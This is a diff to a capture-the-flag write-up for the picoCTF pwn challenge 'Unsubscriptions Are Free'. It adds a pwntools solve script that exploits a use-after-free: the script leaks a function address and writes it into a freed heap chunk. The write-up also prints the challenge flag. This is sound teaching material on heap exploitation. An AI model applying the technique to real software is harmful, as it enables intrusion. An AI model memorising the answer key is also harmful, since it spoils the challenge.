@@ -1,6 +1,6 @@
 # Unsubscriptions Are Free
 
-[![VIDEO WALKTHROUGH](http://img.youtube.com/vi/YGQAvJ__12k/0.jpg)](http://www.youtube.com/watch?v=YGQAvJ__12k "Exploiting a Use-After-Free (UAF) Vulnerability - \"Unsubscriptions Are Free\" Pwn Challenge \[PicoGym\]")
+[![VIDEO WALKTHROUGH](http://img.youtube.com/vi/YGQAvJ__12k/0.jpg)](http://www.youtube.com/watch?v=YGQAvJ__12k "Exploiting a Use-After-Free (UAF) Vulnerability - \"Unsubscriptions\ Are\ Free\"\ Pwn\ Challenge\ \[PicoGym\]")
 
 ## Description
 
@@ -168,7 +168,7 @@ Goal is to call the `hahaexploitgobrrr` function, printing the flag.
 
 `main()` first mallocs a `user` object* from the `cmd` struct, containing a function pointer `whatToDo` and a char pointer `username`.
 
-*Program is 32-bit, so the two pointers are 4 bytes each, and you would assume `malloc(8)`. However, ghidra shows `malloc(4)` because the code uses `(cmd *)malloc(sizeof(user))` where `user` is a 4 byte pointer. However, when we debug the program, we see a 16-byte chunk is assigned, so `malloc(16)`.
+\*Program is 32-bit, so the two pointers are 4 bytes each, and you would assume `malloc(8)`. However, ghidra shows `malloc(4)` because the code uses `(cmd *)malloc(sizeof(user))` where `user` is a 4 byte pointer. However, when we debug the program, we see a 16-byte chunk is assigned, so `malloc(16)`.
 
 `main()` then indefinitely loops:
     - `printMenu()` - print menu options
@@ -227,7 +227,9 @@ The first breakpoint shows the address of the `user` chunk (`0x95cd1a0`), return
    0x8048d92 <main+93>    call   doProcess                     <doProcess>
 ```
 
-The chunk size is 16 (0x11 is 17, but the 1 is a flag to indicate the previous chunk is not free):
+The chunk size is 16
+
+0x11 is 17, but the 1 is a flag to indicate the previous chunk is not free:
 
 ```
 pwndbg> x/8gwx 0x95cd1a0 - 4
@@ -365,4 +367,65 @@ python exploit.py REMOTE mercury.picoctf.net 61817
 [*] leaked hahaexploitgobrrr() address: 0x80487d6
 [!] picoCTF{d0ubl3_j30p4rdy_1e154727}
 [*] Closed connection to mercury.picoctf.net port 61817
+```
+
+## Solve Script
+```py
+from pwn import *
+
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+break *0x8048d6f
+break *0x8048aff
+break *0x8048a61
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './vuln'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+# Create user (not needed, just for demo)
+io.sendlineafter(b'(e)xit', b'M')
+io.sendlineafter(b':', b'crypto')
+
+# Leak memory (win address)
+io.sendlineafter(b'(e)xit', b'S')
+io.recvuntil(b'OOP! Memory leak...', drop=True)
+leak = int(io.recvlineS(), 16)
+info("leaked hahaexploitgobrrr() address: %#x", leak)
+
+# Free the user
+io.sendlineafter(b'(e)xit', b'I')
+io.sendlineafter(b'?', b'Y')
+
+# Leave a message (leaked address)
+# The freed chunk will be reused
+io.sendlineafter(b'(e)xit', b'L')
+io.sendlineafter(b':', flat(leak))
+
+# Got Flag?
+warn(io.recvlines(2)[1].decode())
 ```
